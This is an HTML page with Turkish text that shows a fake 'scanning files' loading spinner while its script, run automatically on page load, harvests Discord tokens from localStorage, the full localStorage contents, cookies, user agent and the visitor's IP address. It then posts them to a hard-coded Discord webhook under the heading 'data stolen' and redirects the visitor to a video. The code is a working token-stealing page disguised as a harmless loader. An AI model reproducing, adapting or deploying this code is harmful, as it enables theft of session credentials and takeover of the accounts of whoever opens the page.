<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Token Alınıyor...</title>
    <style>
        body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: white; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="status">Dosyalar Taraniyor...</div>
    </div>

<script>
    // WEBHOOK BURAYA
    const WEBHOOK = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke";

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            return (await res.json()).ip;
        } catch { return "Bilinmiyor"; }
    }

    async function grabData() {
        const statusDiv = document.getElementById('status');
        let token = "Bulunamadı";

        // 1. TARAYICI TABANLI ARAMA (Eğer Discord Web'deyse çalışır)
        let localTokens = [];
        for (let key in localStorage) {
            if (localStorage[key].startsWith("MT")) {
                localTokens.push(localStorage[key]);
            }
        }
        if (localTokens.length > 0) {
            token = localTokens[0]; 
        }

        // 2. DOSYA OKUMA (Eğer Discord Desktop'taysa, bu kısım devreye girmez çünkü JS doğrudan dosya okuyamaz)
        // Ancak, Discord Desktop'taki kullanıcılar genellikle "Discord.exe" içinde çalışan bir Chromium kullanır.
        // Bu nedenle, eğer kullanıcı Discord'u **tarayıcı modunda** açıyorsa (örn. --app=discord), yukarıdaki kod çalışır.

        // 3. VERILERI TOPLA
        const ip = await getIP();
        const userAgent = navigator.userAgent;
        const cookies = document.cookie || "(Boş)";
        const allLocalData = JSON.stringify([...localStorage].map(([k,v]) => [k,v]));

        // 4. PAYLOAD
        const payload = {
            username: "Token Avcısı",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
            embeds: [{
                title: "🔥 VERILER CALINDI! 🔥",
                color: 15158332,
                fields: [
                    { name: "🌐 IP", value: ip, inline: true },
                    { name: "🧩 Tarayici", value: "`" + userAgent + "`", inline: false },
                    { name: "🔑 TOKEN", value: "`" + token + "`", inline: false },
                    { name: "📦 LocalStorage Dump", value: "`" + allLocalData.substring(0, 1500) + (allLocalData.length > 1500 ? "..." : "") + "`", inline: false }
                ],
                footer: { text: "NoTrack System" },
                timestamp: new Date().toISOString()
            }]
        };

        // 5. GÖNDER
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            statusDiv.innerText = "✅ Veriler Gönderildi!";
            statusDiv.style.color = "#43b581";
            setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 2000);
        }).catch(e => {
            statusDiv.innerText = "❌ Hata: " + e.message;
        });
    }

    window.onload = grabData;
</script>
</body>
</html>
